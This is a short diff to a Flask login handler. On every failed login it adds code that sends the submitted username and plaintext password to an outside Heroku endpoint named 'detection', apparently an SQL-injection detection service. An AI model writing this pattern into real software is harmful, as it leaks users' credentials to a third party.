@@ -3,6 +3,7 @@ from flask.logging import default_handler
 import sqlite3
 import logging
 import datetime
+import requests
 
 conn = sqlite3.connect('webapp.db')
     
@@ -89,6 +90,11 @@ def login_post():
         ]
         print(loginfo)
         flash('failed to login')
+        
+        payload={'event1':request.form["username"],'event2':request.form["password"]}
+        
+        r = requests.post("https://webappsqli.heroku.com/detection", data=payload)
+        
         return redirect('/login')
     
     #ログをローテートする処理を書く
